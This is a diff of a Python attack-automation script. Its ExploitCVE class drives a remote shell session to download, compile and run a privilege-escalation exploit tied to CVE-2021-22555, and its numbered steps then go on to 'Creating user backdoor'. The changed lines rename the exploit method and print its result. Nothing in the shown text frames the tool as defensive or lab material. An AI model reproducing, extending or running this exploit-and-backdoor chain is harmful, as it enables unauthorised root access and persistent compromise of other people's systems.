@@ -135,9 +135,9 @@ class ExploitCVE(object):
         time.sleep(5)
         shell.write('ls -al exploit.c')
     
-    def exploitTarget(self):
+    def exploitPrivilegeEscalation(self):
         """
-        This function will compiling the exploit and run the exploit for privilege escalation
+        This function will compiling the exploit and run the exploit for privilege escalation using CVE-2021-22555
         """
         shell = client.sessions.session(list(client.sessions.list.keys())[0])
         
@@ -220,7 +220,8 @@ def main():
                 print("#    5. Downloading and executing the exploit for privilege escalation...")
                 print("############################################################################")
                 ec.sendCommand()
-                ec.exploitTarget()
+                priv_esc = ec.exploitPrivilegeEscalation()
+                print(priv_esc)
                 print("############################################################################")
                 print("#    6. Creating user backdoor...")
                 print("############################################################################")
@@ -236,8 +237,8 @@ def main():
                     print("#    6. Downloading and executing the exploit for privilege escalation...")
                     print("############################################################################")
                     ec.sendCommand()
-                    ec.exploitTarget()
-                    
+                    priv_esc = ec.exploitPrivilegeEscalation()
+                    print(priv_esc)
                     print("############################################################################")
                     print("#    7. Creating user backdoor...")
                     print("############################################################################")
